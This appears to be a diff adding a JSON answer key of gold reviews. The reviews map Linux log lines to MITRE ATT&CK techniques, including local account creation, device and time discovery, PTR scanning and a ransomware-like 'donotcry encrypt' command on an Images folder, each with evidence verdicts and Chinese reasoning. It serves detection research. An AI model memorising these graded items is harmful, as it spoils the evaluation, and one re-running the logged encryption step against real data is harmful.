@@ -1,0 +1,721 @@
+[
+  {
+    "review_id": "REV_0020",
+    "sample_id": "1-21-r0",
+    "overall": "DIRECT_EVIDENCE_PRESENT",
+    "gold_reviews": [
+      {
+        "technique_id": "T1136",
+        "frozen_name": "Create Account",
+        "frozen_description_sha256": "8cf60fd13c4b8bb2d7561d29c1386c771c461afda67f5d4118f43869004b16ff",
+        "frozen_description": "Local Account persistence Domain Account persistence Cloud Account persistence Create Account persistence Local Account Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. \n\nFor example, with a sufficient level of access, the Windows <code>net user /add</code> command can be used to create a local account. On macOS systems the <code>dscl -create</code> command can be used to create a local account. Local accounts may also be added to network devices, often via common [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as <code>username</code>, or to Kubernetes clusters using the `kubectl` utility.(Citation: cisco_username_cmd)(Citation: Kubernetes Service Accounts Security)\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote ac",
+        "evidence_assessment": "DIRECT_EVIDENCE_PRESENT",
+        "supporting_fact_ids": [
+          "REV_0020_VISIBLE_LINE_002",
+          "REV_0020_VISIBLE_LINE_003"
+        ],
+        "context_fact_ids": [],
+        "reasoning": "useradd明确报告new user webadmin和UID/GID/home/shell，直接支持创建本地账户的核心状态变化；用途、授权合法性与持续访问未由日志认证。",
+        "condition_ids": [
+          "REV_0020_T1136_OBSERVED_ACTION",
+          "REV_0020_T1136_CORE",
+          "REV_0020_T1136_OBJECT",
+          "REV_0020_T1136_ACTOR",
+          "REV_0020_T1136_RESULT",
+          "REV_0020_T1136_DISTINGUISH",
+          "REV_0020_T1136_PARENT_SCOPE"
+        ],
+        "reference_scope_qualification": "LOCAL_ACCOUNT_BRANCH_NOT_EXHAUSTIVE_PARENT",
+        "prerequisite_condition_ids": [
+          "REV_0020_T1136_CORE",
+          "REV_0020_T1136_OBJECT"
+        ],
+        "prerequisite_scope": "定义中的目标、有效材料/访问及核心动作关系在CORE/OBJECT中检验；不把示例实现或某一变体的前提扩展为全部父类必要条件。未提供完整父类时不能穷尽其前提。",
+        "possible_actor_asset_scope": "只保留当前visible_facts字面中的账号、进程、主机和对象；CORE/OBJECT/ACTOR分别检查动作绑定和归属，不由simulation_id反推主体。",
+        "optional_definition_behaviors": "定义中的may、例如、such as及后续用途是可能路径，不将所有举例同时当必要条件",
+        "definition_examples_are_not_observation_facts": true
+      }
+    ],
+    "visible_facts": [
+      {
+        "fact_id": "REV_0020_VISIBLE_LINE_002",
+        "literal_text": "Dec  5 14:08:24 videoserver useradd[17695]: new group: name=webadmin, GID=1003",
+        "source_type": "APPLICATION_SYSTEM_OR_NETWORK_LOG_AS_DISPLAYED_UNCERTIFIED",
+        "text_sha256": "3f7d62fc1601f4a06e9d07804769953c84e3e80572d6a98b4c890d1e1fa6b0b7"
+      },
+      {
+        "fact_id": "REV_0020_VISIBLE_LINE_003",
+        "literal_text": "Dec  5 14:08:24 videoserver useradd[17695]: new user: name=webadmin, UID=1003, GID=1003, home=/home/webadmin, shell=/bin/bash, from=none",
+        "source_type": "APPLICATION_SYSTEM_OR_NETWORK_LOG_AS_DISPLAYED_UNCERTIFIED",
+        "text_sha256": "ff11d591f1a0abbfa4a8db27fc9ccae333e12c9e8d7d27e8b415235e5eb840c7"
+      }
+    ],
+    "reasoning": "useradd明确报告new user webadmin和UID/GID/home/shell，直接支持创建本地账户的核心状态变化；用途、授权合法性与持续访问未由日志认证。",
+    "role": "illustrations after exhaustive384 record review; not a sample substituted for review"
+  },
+  {
+    "review_id": "REV_0022",
+    "sample_id": "1-25-r0",
+    "overall": "DIRECT_EVIDENCE_PRESENT",
+    "gold_reviews": [
+      {
+        "technique_id": "T1120",
+        "frozen_name": "Peripheral Device Discovery",
+        "frozen_description_sha256": "029a8c4555ccbfbca4ea6f42cf4a38ebdbf436d58a7e2dca9a772d6bac9e29ce",
+        "frozen_description": "Peripheral Device Discovery discovery Peripheral Device Discovery Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.(Citation: Peripheral Discovery Linux)(Citation: Peripheral Discovery macOS) Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",
+        "evidence_assessment": "DIRECT_EVIDENCE_PRESENT",
+        "supporting_fact_ids": [
+          "REV_0022_VISIBLE_LINE_001"
+        ],
+        "context_fact_ids": [],
+        "reasoning": "sudo COMMAND明确为lspci，支持发起PCI设备枚举；未提供枚举输出。",
+        "condition_ids": [
+          "REV_0022_T1120_CORE",
+          "REV_0022_T1120_OBJECT",
+          "REV_0022_T1120_ACTOR",
+          "REV_0022_T1120_DISTINGUISH"
+        ],
+        "reference_scope_qualification": "VISIBLE_BODY_GIVES_USABLE_CORE_NOT_INDEPENDENTLY_EXHAUSTIVE",
+        "prerequisite_condition_ids": [
+          "REV_0022_T1120_CORE",
+          "REV_0022_T1120_OBJECT"
+        ],
+        "prerequisite_scope": "定义中的目标、有效材料/访问及核心动作关系在CORE/OBJECT中检验；不把示例实现或某一变体的前提扩展为全部父类必要条件。未提供完整父类时不能穷尽其前提。",
+        "possible_actor_asset_scope": "只保留当前visible_facts字面中的账号、进程、主机和对象；CORE/OBJECT/ACTOR分别检查动作绑定和归属，不由simulation_id反推主体。",
+        "optional_definition_behaviors": "定义中的may、例如、such as及后续用途是可能路径，不将所有举例同时当必要条件",
+        "definition_examples_are_not_observation_facts": true
+      }
+    ],
+    "visible_facts": [
+      {
+        "fact_id": "REV_0022_VISIBLE_LINE_001",
+        "literal_text": "Sep 22 08:04:21 videoserver sudo:   debian : PWD=/home/debian ; USER=root ; COMMAND=/usr/bin/lspci",
+        "source_type": "SUDO_COMMAND_RECORD_AS_DISPLAYED_NOT_PROOF_OF_COMPLETION",
+        "text_sha256": "80c752592b832bf1825618f62ff98598552be56a50edd68a818275a32422f752"
+      }
+    ],
+    "reasoning": "sudo COMMAND明确为lspci，支持发起PCI设备枚举；未提供枚举输出。",
+    "role": "illustrations after exhaustive384 record review; not a sample substituted for review"
+  },
+  {
+    "review_id": "REV_0025",
+    "sample_id": "1-25-r3",
+    "overall": "NO_RELEVANT_EVIDENCE_IN_VISIBLE_SCOPE",
+    "gold_reviews": [
+      {
+        "technique_id": "T1120",
+        "frozen_name": "Peripheral Device Discovery",
+        "frozen_description_sha256": "029a8c4555ccbfbca4ea6f42cf4a38ebdbf436d58a7e2dca9a772d6bac9e29ce",
+        "frozen_description": "Peripheral Device Discovery discovery Peripheral Device Discovery Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.(Citation: Peripheral Discovery Linux)(Citation: Peripheral Discovery macOS) Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",
+        "evidence_assessment": "NO_RELEVANT_EVIDENCE_IN_VISIBLE_SCOPE",
+        "supporting_fact_ids": [],
+        "context_fact_ids": [],
+        "reasoning": "逐视图区分lspci调用与普通SSH凭据/会话。lspci调用支持PCI设备枚举尝试，不证明输出或恶意归属。仅SSH会话视图不能借用其他采样的lspci证据。",
+        "condition_ids": [
+          "REV_0025_T1120_CORE",
+          "REV_0025_T1120_OBJECT",
+          "REV_0025_T1120_ACTOR",
+          "REV_0025_T1120_DISTINGUISH"
+        ],
+        "reference_scope_qualification": "VISIBLE_BODY_GIVES_USABLE_CORE_NOT_INDEPENDENTLY_EXHAUSTIVE",
+        "prerequisite_condition_ids": [
+          "REV_0025_T1120_CORE",
+          "REV_0025_T1120_OBJECT"
+        ],
+        "prerequisite_scope": "定义中的目标、有效材料/访问及核心动作关系在CORE/OBJECT中检验；不把示例实现或某一变体的前提扩展为全部父类必要条件。未提供完整父类时不能穷尽其前提。",
+        "possible_actor_asset_scope": "只保留当前visible_facts字面中的账号、进程、主机和对象；CORE/OBJECT/ACTOR分别检查动作绑定和归属，不由simulation_id反推主体。",
+        "optional_definition_behaviors": "定义中的may、例如、such as及后续用途是可能路径，不将所有举例同时当必要条件",
+        "definition_examples_are_not_observation_facts": true
+      }
+    ],
+    "visible_facts": [],
+    "reasoning": "逐视图区分lspci调用与普通SSH凭据/会话。lspci调用支持PCI设备枚举尝试，不证明输出或恶意归属。仅SSH会话视图不能借用其他采样的lspci证据。",
+    "role": "illustrations after exhaustive384 record review; not a sample substituted for review"
+  },
+  {
+    "review_id": "REV_0027",
+    "sample_id": "1-26-r0",
+    "overall": "PARTIAL_EVIDENCE_PRESENT",
+    "gold_reviews": [
+      {
+        "technique_id": "T1120",
+        "frozen_name": "Peripheral Device Discovery",
+        "frozen_description_sha256": "029a8c4555ccbfbca4ea6f42cf4a38ebdbf436d58a7e2dca9a772d6bac9e29ce",
+        "frozen_description": "Peripheral Device Discovery discovery Peripheral Device Discovery Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.(Citation: Peripheral Discovery Linux)(Citation: Peripheral Discovery macOS) Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",
+        "evidence_assessment": "PARTIAL_EVIDENCE_PRESENT",
+        "supporting_fact_ids": [
+          "REV_0027_VISIBLE_LINE_001",
+          "REV_0027_VISIBLE_LINE_004"
+        ],
+        "context_fact_ids": [],
+        "reasoning": "仅检查lsusb命令是否可用；没有执行设备枚举或输出。",
+        "condition_ids": [
+          "REV_0027_T1120_CORE",
+          "REV_0027_T1120_OBJECT",
+          "REV_0027_T1120_ACTOR",
+          "REV_0027_T1120_DISTINGUISH"
+        ],
+        "reference_scope_qualification": "VISIBLE_BODY_GIVES_USABLE_CORE_NOT_INDEPENDENTLY_EXHAUSTIVE",
+        "prerequisite_condition_ids": [
+          "REV_0027_T1120_CORE",
+          "REV_0027_T1120_OBJECT"
+        ],
+        "prerequisite_scope": "定义中的目标、有效材料/访问及核心动作关系在CORE/OBJECT中检验；不把示例实现或某一变体的前提扩展为全部父类必要条件。未提供完整父类时不能穷尽其前提。",
+        "possible_actor_asset_scope": "只保留当前visible_facts字面中的账号、进程、主机和对象；CORE/OBJECT/ACTOR分别检查动作绑定和归属，不由simulation_id反推主体。",
+        "optional_definition_behaviors": "定义中的may、例如、such as及后续用途是可能路径，不将所有举例同时当必要条件",
+        "definition_examples_are_not_observation_facts": true
+      }
+    ],
+    "visible_facts": [
+      {
+        "fact_id": "REV_0027_VISIBLE_LINE_001",
+        "literal_text": "Sep 24 12:56:27 videoserver sudo:   debian : PWD=/home/debian ; USER=root ; COMMAND=/usr/bin/bash -c command -v lsusb",
+        "source_type": "SUDO_COMMAND_RECORD_AS_DISPLAYED_NOT_PROOF_OF_COMPLETION",
+        "text_sha256": "1aa3764b5f34209195157a9f3fa10da18867f008adce44f53ace303c2aad0b3e"
+      },
+      {
+        "fact_id": "REV_0027_VISIBLE_LINE_004",
+        "literal_text": "type=USER_CMD msg=audit(1758718587.031:13426): pid=17238 uid=1000 auid=1000 ses=8 subj==unconfined msg='cwd=\"/home/debian\" cmd=62617368202D6320636F6D6D616E64202D76206C73757362 exe=\"/usr/bin/sudo\" terminal=? res=success'",
+        "source_type": "AUDIT_RECORD_AS_DISPLAYED_NOT_INDEPENDENTLY_CERTIFIED",
+        "text_sha256": "433d8984f0c1a86b530f235c2bf98c875c727835303a058f720cfb8bc98d1299"
+      }
+    ],
+    "reasoning": "仅检查lsusb命令是否可用；没有执行设备枚举或输出。",
+    "role": "illustrations after exhaustive384 record review; not a sample substituted for review"
+  },
+  {
+    "review_id": "REV_0033",
+    "sample_id": "1-27-r1",
+    "overall": "DIRECT_EVIDENCE_PRESENT",
+    "gold_reviews": [
+      {
+        "technique_id": "T1124",
+        "frozen_name": "System Time Discovery",
+        "frozen_description_sha256": "a15f5b873f8987ef4afb488785ee65625dd3f94f292b3dead35eeb48f0ee2ddc",
+        "frozen_description": "System Time Discovery discovery System Time Discovery An adversary may gather the system time and/or time zone settings from a local or remote system. The system time is set and stored by services, such as the Windows Time Service on Windows or <code>systemsetup</code> on macOS.(Citation: MSDN System Time)(Citation: Technet Windows Time Service)(Citation: systemsetup mac time) These time settings may also be synchronized between systems and services in an enterprise network, typically accomplished with a network time server within a domain.(Citation: Mac Time Sync)(Citation: linux system time)\n\nSystem time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time \\\\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>.(Citation: Technet Windows Time Service) In addition, ad",
+        "evidence_assessment": "DIRECT_EVIDENCE_PRESENT",
+        "supporting_fact_ids": [
+          "REV_0033_VISIBLE_LINE_003"
+        ],
+        "context_fact_ids": [],
+        "reasoning": "EXECVE参数明确date调用，支持主动查询系统时间的尝试；没有时区或返回值。",
+        "condition_ids": [
+          "REV_0033_T1124_CORE",
+          "REV_0033_T1124_OBJECT",
+          "REV_0033_T1124_ACTOR",
+          "REV_0033_T1124_DISTINGUISH"
+        ],
+        "reference_scope_qualification": "VISIBLE_BODY_GIVES_USABLE_CORE_NOT_INDEPENDENTLY_EXHAUSTIVE",
+        "prerequisite_condition_ids": [
+          "REV_0033_T1124_CORE",
+          "REV_0033_T1124_OBJECT"
+        ],
+        "prerequisite_scope": "定义中的目标、有效材料/访问及核心动作关系在CORE/OBJECT中检验；不把示例实现或某一变体的前提扩展为全部父类必要条件。未提供完整父类时不能穷尽其前提。",
+        "possible_actor_asset_scope": "只保留当前visible_facts字面中的账号、进程、主机和对象；CORE/OBJECT/ACTOR分别检查动作绑定和归属，不由simulation_id反推主体。",
+        "optional_definition_behaviors": "定义中的may、例如、such as及后续用途是可能路径，不将所有举例同时当必要条件",
+        "definition_examples_are_not_observation_facts": true
+      }
+    ],
+    "visible_facts": [
+      {
+        "fact_id": "REV_0033_VISIBLE_LINE_003",
+        "literal_text": "type=EXECVE msg=audit(1758117468.636:15092): argc=3 a0=\"bash\" a1=\"-c\" a2=\"date\"",
+        "source_type": "AUDIT_RECORD_AS_DISPLAYED_NOT_INDEPENDENTLY_CERTIFIED",
+        "text_sha256": "873b4ca7b433f53f65389e7ea9f58eb5482e8142e3d3c7345d1110d5b1a08518"
+      }
+    ],
+    "reasoning": "EXECVE参数明确date调用，支持主动查询系统时间的尝试；没有时区或返回值。",
+    "role": "illustrations after exhaustive384 record review; not a sample substituted for review"
+  },
+  {
+    "review_id": "REV_0118",
+    "sample_id": "2-21-r0",
+    "overall": "PARTIAL_EVIDENCE_PRESENT",
+    "gold_reviews": [
+      {
+        "technique_id": "T1018",
+        "frozen_name": "Remote System Discovery",
+        "frozen_description_sha256": "21eed964c4436e8805c451abe286da20fbd8fe5a4700bb97b5109afcc9ddd1c1",
+        "frozen_description": "Remote System Discovery discovery Remote System Discovery Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097) or <code>net view</code> using [Net](https://attack.mitre.org/software/S0039).\n\nAdversaries may also analyze data from local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099) cache entries) in order to discover the presence of remote systems in an environment.\n\nAdversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on networ",
+        "evidence_assessment": "DIRECT_EVIDENCE_PRESENT",
+        "supporting_fact_ids": [
+          "REV_0118_VISIBLE_LINE_002",
+          "REV_0118_VISIBLE_LINE_004",
+          "REV_0118_VISIBLE_LINE_006"
+        ],
+        "context_fact_ids": [],
+        "reasoning": "多个目标地址的反向名称查询直接支持获取其他系统标识信息的尝试；不认证查询成功或恶意目的。",
+        "condition_ids": [
+          "REV_0118_T1018_CORE",
+          "REV_0118_T1018_OBJECT",
+          "REV_0118_T1018_ACTOR",
+          "REV_0118_T1018_DISTINGUISH"
+        ],
+        "reference_scope_qualification": "VISIBLE_BODY_GIVES_USABLE_CORE_NOT_INDEPENDENTLY_EXHAUSTIVE",
+        "prerequisite_condition_ids": [
+          "REV_0118_T1018_CORE",
+          "REV_0118_T1018_OBJECT"
+        ],
+        "prerequisite_scope": "定义中的目标、有效材料/访问及核心动作关系在CORE/OBJECT中检验；不把示例实现或某一变体的前提扩展为全部父类必要条件。未提供完整父类时不能穷尽其前提。",
+        "possible_actor_asset_scope": "只保留当前visible_facts字面中的账号、进程、主机和对象；CORE/OBJECT/ACTOR分别检查动作绑定和归属，不由simulation_id反推主体。",
+        "optional_definition_behaviors": "定义中的may、例如、such as及后续用途是可能路径，不将所有举例同时当必要条件",
+        "definition_examples_are_not_observation_facts": true
+      },
+      {
+        "technique_id": "T1046",
+        "frozen_name": "Network Service Discovery",
+        "frozen_description_sha256": "fea6ba8411ed45dc0a6c2fe7dfbe7861a14ec9d7b9f108700905a0fc669ec002",
+        "frozen_description": "Network Service Discovery discovery Network Service Discovery Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.(Citation: CISA AR21-126A FIVEHANDS May 2021)   \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.\n\nWithin macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host’s registered services on the network. For example, adversaries can use a mDN",
+        "evidence_assessment": "BACKGROUND_COMPATIBILITY_ONLY",
+        "supporting_fact_ids": [],
+        "context_fact_ids": [],
+        "reasoning": "地址反查不等于列举远程服务，未提供端口、服务名或服务banner。",
+        "condition_ids": [
+          "REV_0118_T1046_CORE",
+          "REV_0118_T1046_OBJECT",
+          "REV_0118_T1046_ACTOR",
+          "REV_0118_T1046_DISTINGUISH"
+        ],
+        "reference_scope_qualification": "VISIBLE_BODY_GIVES_USABLE_CORE_NOT_INDEPENDENTLY_EXHAUSTIVE",
+        "prerequisite_condition_ids": [
+          "REV_0118_T1046_CORE",
+          "REV_0118_T1046_OBJECT"
+        ],
+        "prerequisite_scope": "定义中的目标、有效材料/访问及核心动作关系在CORE/OBJECT中检验；不把示例实现或某一变体的前提扩展为全部父类必要条件。未提供完整父类时不能穷尽其前提。",
+        "possible_actor_asset_scope": "只保留当前visible_facts字面中的账号、进程、主机和对象；CORE/OBJECT/ACTOR分别检查动作绑定和归属，不由simulation_id反推主体。",
+        "optional_definition_behaviors": "定义中的may、例如、such as及后续用途是可能路径，不将所有举例同时当必要条件",
+        "definition_examples_are_not_observation_facts": true
+      }
+    ],
+    "visible_facts": [
+      {
+        "fact_id": "REV_0118_VISIBLE_LINE_002",
+        "literal_text": "Oct  1 10:35:06 inetfw dnsmasq[733]: query[PTR] 80.100.17.172.in-addr.arpa from 172.17.100.121",
+        "source_type": "APPLICATION_SYSTEM_OR_NETWORK_LOG_AS_DISPLAYED_UNCERTIFIED",
+        "text_sha256": "1aaae2c28440eea9dcf8b5ff25c81aebf9002466c825cd355ef5964585eff633"
+      },
+      {
+        "fact_id": "REV_0118_VISIBLE_LINE_004",
+        "literal_text": "Oct  1 10:35:06 inetfw dnsmasq[733]: query[PTR] 201.100.17.172.in-addr.arpa from 172.17.100.121",
+        "source_type": "APPLICATION_SYSTEM_OR_NETWORK_LOG_AS_DISPLAYED_UNCERTIFIED",
+        "text_sha256": "8a5df3752c51ec936b1518349bf466444e9986cd6a4b2a4fa8a9b54d432690c6"
+      },
+      {
+        "fact_id": "REV_0118_VISIBLE_LINE_006",
+        "literal_text": "Oct  1 10:35:06 inetfw dnsmasq[733]: query[PTR] 254.100.17.172.in-addr.arpa from 172.17.100.121",
+        "source_type": "APPLICATION_SYSTEM_OR_NETWORK_LOG_AS_DISPLAYED_UNCERTIFIED",
+        "text_sha256": "c313c3cf3cbe90dbf22694538fd21c54efdcb1972b991eb76ad67a26546e211b"
+      }
+    ],
+    "reasoning": "同源连续PTR请求多个172.17.100地址，直接相关于主动查询远程地址身份；未见返回主机清单或服务端口。",
+    "role": "illustrations after exhaustive384 record review; not a sample substituted for review"
+  },
+  {
+    "review_id": "REV_0158",
+    "sample_id": "3-26-r0",
+    "overall": "PARTIAL_EVIDENCE_PRESENT",
+    "gold_reviews": [
+      {
+        "technique_id": "T1486",
+        "frozen_name": "Data Encrypted for Impact",
+        "frozen_description_sha256": "57d8c31a631d4220396a3bf3ddc801fcd25535976dc66fff75094cab6d4821b1",
+        "frozen_description": "Data Encrypted for Impact impact Data Encrypted for Impact Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018)\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, s",
+        "evidence_assessment": "PARTIAL_EVIDENCE_PRESENT",
+        "supporting_fact_ids": [
+          "REV_0158_VISIBLE_LINE_003"
+        ],
+        "context_fact_ids": [],
+        "reasoning": "EXECVE明确对Images目录发起encrypt命令；未知程序语义和文件内容/可用性结果。",
+        "condition_ids": [
+          "REV_0158_T1486_CORE",
+          "REV_0158_T1486_OBJECT",
+          "REV_0158_T1486_ACTOR",
+          "REV_0158_T1486_RESULT",
+          "REV_0158_T1486_DISTINGUISH"
+        ],
+        "reference_scope_qualification": "VISIBLE_BODY_GIVES_USABLE_CORE_NOT_INDEPENDENTLY_EXHAUSTIVE",
+        "prerequisite_condition_ids": [
+          "REV_0158_T1486_CORE",
+          "REV_0158_T1486_OBJECT"
+        ],
+        "prerequisite_scope": "定义中的目标、有效材料/访问及核心动作关系在CORE/OBJECT中检验；不把示例实现或某一变体的前提扩展为全部父类必要条件。未提供完整父类时不能穷尽其前提。",
+        "possible_actor_asset_scope": "只保留当前visible_facts字面中的账号、进程、主机和对象；CORE/OBJECT/ACTOR分别检查动作绑定和归属，不由simulation_id反推主体。",
+        "optional_definition_behaviors": "定义中的may、例如、such as及后续用途是可能路径，不将所有举例同时当必要条件",
+        "definition_examples_are_not_observation_facts": true
+      },
+      {
+        "technique_id": "T1565",
+        "frozen_name": "Data Manipulation",
+        "frozen_description_sha256": "6aa705974c92aab45ac6b66469f5228424e3b25e84bb77358949309dc7778b8e",
+        "frozen_description": "Stored Data Manipulation impact Runtime Data Manipulation impact Data Manipulation impact Transmitted Data Manipulation impact Stored Data Manipulation Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in ord",
+        "evidence_assessment": "PARTIAL_EVIDENCE_PRESENT",
+        "supporting_fact_ids": [
+          "REV_0158_VISIBLE_LINE_003"
+        ],
+        "context_fact_ids": [],
+        "reasoning": "EXECVE明确对Images目录发起encrypt命令；未知程序语义和文件内容/可用性结果。",
+        "condition_ids": [
+          "REV_0158_T1565_CORE",
+          "REV_0158_T1565_OBJECT",
+          "REV_0158_T1565_ACTOR",
+          "REV_0158_T1565_RESULT",
+          "REV_0158_T1565_DISTINGUISH",
+          "REV_0158_T1565_PARENT_SCOPE"
+        ],
+        "reference_scope_qualification": "STORED_DATA_VARIANT_NOT_EXHAUSTIVE_PARENT",
+        "prerequisite_condition_ids": [
+          "REV_0158_T1565_CORE",
+          "REV_0158_T1565_OBJECT"
+        ],
+        "prerequisite_scope": "定义中的目标、有效材料/访问及核心动作关系在CORE/OBJECT中检验；不把示例实现或某一变体的前提扩展为全部父类必要条件。未提供完整父类时不能穷尽其前提。",
+        "possible_actor_asset_scope": "只保留当前visible_facts字面中的账号、进程、主机和对象；CORE/OBJECT/ACTOR分别检查动作绑定和归属，不由simulation_id反推主体。",
+        "optional_definition_behaviors": "定义中的may、例如、such as及后续用途是可能路径，不将所有举例同时当必要条件",
+        "definition_examples_are_not_observation_facts": true
+      }
+    ],
+    "visible_facts": [
+      {
+        "fact_id": "REV_0158_VISIBLE_LINE_003",
+        "literal_text": "type=EXECVE msg=audit(1765741862.652:3236): argc=4 a0=\"/lib64/ld-linux-x86-64.so.2\" a1=\"/opt/donotcry\" a2=\"encrypt\" a3=\"/media/data/Images\"",
+        "source_type": "AUDIT_RECORD_AS_DISPLAYED_NOT_INDEPENDENTLY_CERTIFIED",
+        "text_sha256": "176bc0508f3d65c686ede0756223b45c59c33068309a3ecb760792e4f66b92af"
+      }
+    ],
+    "reasoning": "EXECVE明确对Images目录发起encrypt命令；未知程序语义和文件内容/可用性结果。",
+    "role": "illustrations after exhaustive384 record review; not a sample substituted for review"
+  },
+  {
+    "review_id": "REV_0159",
+    "sample_id": "3-26-r1",
+    "overall": "BACKGROUND_COMPATIBILITY_ONLY",
+    "gold_reviews": [
+      {
+        "technique_id": "T1486",
+        "frozen_name": "Data Encrypted for Impact",
+        "frozen_description_sha256": "57d8c31a631d4220396a3bf3ddc801fcd25535976dc66fff75094cab6d4821b1",
+        "frozen_description": "Data Encrypted for Impact impact Data Encrypted for Impact Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018)\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, s",
+        "evidence_assessment": "BACKGROUND_COMPATIBILITY_ONLY",
+        "supporting_fact_ids": [],
+        "context_fact_ids": [
+          "REV_0159_VISIBLE_LINE_003",
+          "REV_0159_VISIBLE_LINE_005"
+        ],
+        "reasoning": "仅同inode文件名改为donotcry后缀；不认证加密或内容篡改。",
+        "condition_ids": [
+          "REV_0159_T1486_CORE",
+          "REV_0159_T1486_OBJECT",
+          "REV_0159_T1486_ACTOR",
+          "REV_0159_T1486_RESULT",
+          "REV_0159_T1486_DISTINGUISH"
+        ],
+        "reference_scope_qualification": "VISIBLE_BODY_GIVES_USABLE_CORE_NOT_INDEPENDENTLY_EXHAUSTIVE",
+        "prerequisite_condition_ids": [
+          "REV_0159_T1486_CORE",
+          "REV_0159_T1486_OBJECT"
+        ],
+        "prerequisite_scope": "定义中的目标、有效材料/访问及核心动作关系在CORE/OBJECT中检验；不把示例实现或某一变体的前提扩展为全部父类必要条件。未提供完整父类时不能穷尽其前提。",
+        "possible_actor_asset_scope": "只保留当前visible_facts字面中的账号、进程、主机和对象；CORE/OBJECT/ACTOR分别检查动作绑定和归属，不由simulation_id反推主体。",
+        "optional_definition_behaviors": "定义中的may、例如、such as及后续用途是可能路径，不将所有举例同时当必要条件",
+        "definition_examples_are_not_observation_facts": true
+      },
+      {
+        "technique_id": "T1565",
+        "frozen_name": "Data Manipulation",
+        "frozen_description_sha256": "6aa705974c92aab45ac6b66469f5228424e3b25e84bb77358949309dc7778b8e",
+        "frozen_description": "Stored Data Manipulation impact Runtime Data Manipulation impact Data Manipulation impact Transmitted Data Manipulation impact Stored Data Manipulation Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in ord",
+        "evidence_assessment": "BACKGROUND_COMPATIBILITY_ONLY",
+        "supporting_fact_ids": [],
+        "context_fact_ids": [
+          "REV_0159_VISIBLE_LINE_003",
+          "REV_0159_VISIBLE_LINE_005"
+        ],
+        "reasoning": "仅同inode文件名改为donotcry后缀；不认证加密或内容篡改。",
+        "condition_ids": [
+          "REV_0159_T1565_CORE",
+          "REV_0159_T1565_OBJECT",
+          "REV_0159_T1565_ACTOR",
+          "REV_0159_T1565_RESULT",
+          "REV_0159_T1565_DISTINGUISH",
+          "REV_0159_T1565_PARENT_SCOPE"
+        ],
+        "reference_scope_qualification": "STORED_DATA_VARIANT_NOT_EXHAUSTIVE_PARENT",
+        "prerequisite_condition_ids": [
+          "REV_0159_T1565_CORE",
+          "REV_0159_T1565_OBJECT"
+        ],
+        "prerequisite_scope": "定义中的目标、有效材料/访问及核心动作关系在CORE/OBJECT中检验；不把示例实现或某一变体的前提扩展为全部父类必要条件。未提供完整父类时不能穷尽其前提。",
